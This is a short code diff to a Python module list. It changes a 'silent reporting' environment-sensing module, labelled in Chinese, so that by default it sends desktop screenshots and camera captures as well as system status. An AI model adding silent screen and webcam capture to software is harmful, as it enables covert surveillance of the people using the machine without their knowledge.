@@ -41,7 +41,7 @@ MODULES: tuple[ModuleDef, ...] = (
         label="环境感知模块",
         names=("环境感知模块", "env_sense", "env"),
         description="系统与环境状态静默上报",
-        default_msg_types=("system_status",),
+        default_msg_types=("system_status", "desktop_screenshot", "camera_capture"),
         icon="📡",
     ),
     ModuleDef(
